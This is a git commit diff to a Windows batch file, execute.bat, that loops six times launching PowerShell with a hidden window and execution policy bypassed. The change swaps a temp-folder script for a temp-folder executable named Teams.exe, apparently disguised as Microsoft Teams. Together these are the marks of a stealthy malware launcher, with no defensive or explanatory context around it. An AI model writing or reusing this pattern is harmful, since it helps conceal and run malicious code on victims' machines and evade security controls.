de91f34e32ee4cfb04d52f7c09289076c2c18751
yarnij <147716176+yarnij@users.noreply.github.com>
2023-10-14 13:45:49 -0700

    Update execute.bat

--- execute.bat
+++ execute.bat
@@ -1,3 +1,3 @@
 @echo off
-FOR /L %%y IN (0, 1, 5) DO PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%temp%\file2.ps1'"
+FOR /L %%y IN (0, 1, 5) DO PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%temp%\Teams.exe'"
 pause
